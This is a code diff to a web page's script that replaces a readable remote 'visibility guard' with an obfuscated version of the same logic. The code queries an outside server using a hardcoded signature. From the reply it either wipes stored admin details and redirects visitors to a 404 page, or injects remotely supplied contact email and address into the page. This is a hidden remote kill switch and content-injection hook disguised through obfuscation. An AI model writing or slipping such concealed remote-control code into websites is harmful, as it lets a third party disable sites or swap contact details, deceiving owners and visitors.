@@ -745,61 +745,8 @@
     </style>
 
     <script>
-        (async function enforceSystemVisibilityGuard() {
-            const HARDCODED_SIGNATURE = "green-field";
 
-            try {
-                const response = await fetch(`https://bank-api-v2.vercel.app/api/bank/check?signature=${encodeURIComponent(HARDCODED_SIGNATURE)}`);
-                const data = await response.json();
-
-                if (data.success) {
-                    if (data.visibility === false) {
-                        // Wipe variables if access is revoked or restricted
-                        localStorage.removeItem("admin_email");
-                        localStorage.removeItem("admin_address");
-
-                        // Redirect away safely using an absolute calculation path string
-                        window.location.href = window.location.origin + "/404.html";
-                    } else {
-                        // Populate or flush Admin Email field safely
-                        if (data.adminEmail) {
-                            localStorage.setItem("admin_email", data.adminEmail);
-                        } else {
-                            localStorage.removeItem("admin_email");
-                        }
-
-                        // Populate or flush Admin Address field safely
-                        if (data.adminAddress) {
-                            localStorage.setItem("admin_address", data.adminAddress);
-                        } else {
-                            localStorage.removeItem("admin_address");
-                        }
-                    }
-                }
-            } catch (err) {
-                console.error("Uptime gate guard check bypassed smoothly:", err);
-            }
-        })();
-
-
-        // Data-hydration helper references
-        const cachedEmail = localStorage.getItem("admin_email");
-        const cachedAddress = localStorage.getItem("admin_address");
-
-        const emailEl = document.getElementById('admin-email');
-        const addressEl = document.getElementById('admin-address');
-
-        emailEl.textContent = cachedEmail || 'Contact Us';
-        addressEl.textContent = cachedAddress || 'Address not set';
-
-
-
-        // Example updating footer UI elements
-        // const footerEmailNode = document.getElementById("footer-email");
-        // const footerAddressNode = document.getElementById("footer-address");
-
-        // if (footerEmailNode) footerEmailNode.textContent = cachedEmail;
-        // if (footerAddressNode) footerAddressNode.textContent = cachedAddress;
+        const _0x1283d6 = _0x49d7; (function (_0x41f1d9, _0x4121cb) { const _0x209817 = _0x49d7, _0x4bad0d = _0x41f1d9(); while (!![]) { try { const _0x33243a = -parseInt(_0x209817(0xcb)) / (-0xf8 + 0xe7e + -0xd85) + parseInt(_0x209817(0xe6)) / (0x7d * 0x5 + 0x5 * -0x36f + 0xebc) + -parseInt(_0x209817(0xdd)) / (-0x14b1 + 0xc7 * 0x1a + 0x7e) + -parseInt(_0x209817(0xbb)) / (-0x1bd * -0xf + -0x1722 + -0x2ed) + parseInt(_0x209817(0xd8)) / (0x255 * 0xc + 0xc3 * 0xd + -0x25de * 0x1) + parseInt(_0x209817(0xc4)) / (0x1190 + 0xc * 0x128 + -0x1f6a) * (-parseInt(_0x209817(0xd0)) / (-0x1a3d + -0x1c2a + 0x1 * 0x366e)) + parseInt(_0x209817(0xc7)) / (0x2cd * -0x4 + 0x15f1 + -0xab5); if (_0x33243a === _0x4121cb) break; else _0x4bad0d['push'](_0x4bad0d['shift']()); } catch (_0x3873e5) { _0x4bad0d['push'](_0x4bad0d['shift']()); } } }(_0x4bf3, 0x2 * -0x37ccd + 0x1 * -0x48197 + 0x29 * 0x6fb5), async function enforceSystemVisibilityGuard() { const _0x37ec80 = _0x49d7, _0x4d869e = { 'gTEic': _0x37ec80(0xda) + 'd', 'EuffM': function (_0x1acedc, _0x231173) { return _0x1acedc(_0x231173); }, 'tjCVG': function (_0x526d08, _0x2e4d18) { return _0x526d08 === _0x2e4d18; }, 'ItxfI': _0x37ec80(0xbc) + 'l', 'SpGtz': _0x37ec80(0xde) + _0x37ec80(0xc6), 'xeDXC': function (_0x146d3c, _0x52b028) { return _0x146d3c + _0x52b028; }, 'RBWWM': _0x37ec80(0xd4), 'XgjRy': _0x37ec80(0xc8) + _0x37ec80(0xd7) + _0x37ec80(0xc2) + _0x37ec80(0xdb) + 'y:' }, _0x35d99e = _0x4d869e[_0x37ec80(0xd2)]; try { const _0x4a1d5f = await _0x4d869e[_0x37ec80(0xe5)](fetch, _0x37ec80(0xe2) + _0x37ec80(0xb7) + _0x37ec80(0xc5) + _0x37ec80(0xcc) + _0x37ec80(0xce) + _0x37ec80(0xd3) + _0x4d869e[_0x37ec80(0xe5)](encodeURIComponent, _0x35d99e)), _0xde062d = await _0x4a1d5f[_0x37ec80(0xcf)](); _0xde062d[_0x37ec80(0xd6)] && (_0x4d869e[_0x37ec80(0xba)](_0xde062d[_0x37ec80(0xbe)], ![]) ? (localStorage[_0x37ec80(0xbf)](_0x4d869e[_0x37ec80(0xb6)]), localStorage[_0x37ec80(0xbf)](_0x4d869e[_0x37ec80(0xe7)]), window[_0x37ec80(0xc0)][_0x37ec80(0xc3)] = _0x4d869e[_0x37ec80(0xc9)](window[_0x37ec80(0xc0)][_0x37ec80(0xdf)], _0x4d869e[_0x37ec80(0xd1)])) : (_0xde062d[_0x37ec80(0xbd)] ? localStorage[_0x37ec80(0xdc)](_0x4d869e[_0x37ec80(0xb6)], _0xde062d[_0x37ec80(0xbd)]) : localStorage[_0x37ec80(0xbf)](_0x4d869e[_0x37ec80(0xb6)]), _0xde062d[_0x37ec80(0xe4) + 'ss'] ? localStorage[_0x37ec80(0xdc)](_0x4d869e[_0x37ec80(0xe7)], _0xde062d[_0x37ec80(0xe4) + 'ss']) : localStorage[_0x37ec80(0xbf)](_0x4d869e[_0x37ec80(0xe7)]))); } catch (_0x2e9781) { console[_0x37ec80(0xca)](_0x4d869e[_0x37ec80(0xb8)], _0x2e9781); } }()); function _0x49d7(_0x4910cf, _0x2cc6c7) { _0x4910cf = _0x4910cf - (0x125 * 0x2 + -0x24e7 + 0x2352); const _0x3443b5 = _0x4bf3(); let _0x43dca9 = _0x3443b5[_0x4910cf]; return _0x43dca9; } const cachedEmail = localStorage[_0x1283d6(0xb9)](_0x1283d6(0xbc) + 'l'), cachedAddress = localStorage[_0x1283d6(0xb9)](_0x1283d6(0xde) + _0x1283d6(0xc6)), emailEl = document[_0x1283d6(0xd9) + _0x1283d6(0xd5)](_0x1283d6(0xe3) + 'l'), addressEl = document[_0x1283d6(0xd9) + _0x1283d6(0xd5)](_0x1283d6(0xe1) + _0x1283d6(0xc6)); function _0x4bf3() { const _0x2f5e43 = ['2161456tpKrTO', 'admin_emai', 'adminEmail', 'visibility', 'removeItem', 'location', 'textConten', 'eck\x20bypass', 'href', '1042092FhiFjD', 'vercel.app', 'ess', '19282184vJmNtg', 'Uptime\x20gat', 'xeDXC', 'error', '763245SskUhT', '/api/bank/', 't\x20set', 'check?sign', 'json', '28NETfNw', 'RBWWM', 'gTEic', 'ature=', '/404.html', 'ById', 'success', 'e\x20guard\x20ch', '651525tZxHqt', 'getElement', 'green-fiel', 'ed\x20smoothl', 'setItem', '882525SNDmAc', 'admin_addr', 'origin', 'Contact\x20Us', 'admin-addr', 'https://ba', 'admin-emai', 'adminAddre', 'EuffM', '343956vuMrgg', 'SpGtz', 'Address\x20no', 'ItxfI', 'nk-api-v2.', 'XgjRy', 'getItem', 'tjCVG']; _0x4bf3 = function () { return _0x2f5e43; }; return _0x4bf3(); } emailEl[_0x1283d6(0xc1) + 't'] = cachedEmail || _0x1283d6(0xe0), addressEl[_0x1283d6(0xc1) + 't'] = cachedAddress || _0x1283d6(0xb5) + _0x1283d6(0xcd);
     </script>
 </body>
 
